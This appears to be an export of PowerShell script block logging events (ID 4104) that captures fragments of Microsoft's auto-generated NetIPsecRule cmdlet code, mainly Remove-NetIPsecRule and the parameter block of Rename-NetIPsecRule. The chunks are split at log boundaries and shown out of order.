    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Mode') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Mode})
        $__cmdletization_queryBuilder.FilterByProperty('Mode', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('InboundSecurity', $__cmdle

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (11 of 23):
 $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowWatchKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowWatchKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowSetKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowSetKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowSetKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteTunnelHostname})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteTunnelEndpointDNSName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForwardPathLifetime') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForwardPathLifetime})
        $__cmdletization_queryBuilder.FilterByProperty('MaxReturnPathLifetimeSeconds', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EncryptedTunnelBypass})
        $__cmdletization_queryBuilder.FilterByProperty('BypassTunnelIfEncrypted', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RequireAuthorization') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RequireAuthorization})
        $__cmdletization_queryBuilder.FilterByProperty('RequireAuthorization', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('User') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${User})
        $__cmdletization_queryBuilder.FilterByProperty('Users', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Machine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Machine})
        $__cmdletization_queryBuilder.FilterByProperty('Machines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetConSecRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetConSecRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetConSecRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase2AuthSet') -and (@('ByAssociatedNetIPsecPhase2AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase2AuthSet}, 'MSFT_NetConSecRuleEMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetConSecRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeCryptoSet') -and (@('ByAssociatedNetIPsecQuickModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeCryptoSet}, 'MSFT_NetConSecRuleQMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecRule' -Alias '*'
        

function Rename-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]

    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode[]]
    ${Mode},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecIn')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecOut')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule[]]
    ${KeyModule},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${User},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Machine},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicySto

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (10 of 23):
ter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase2AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        
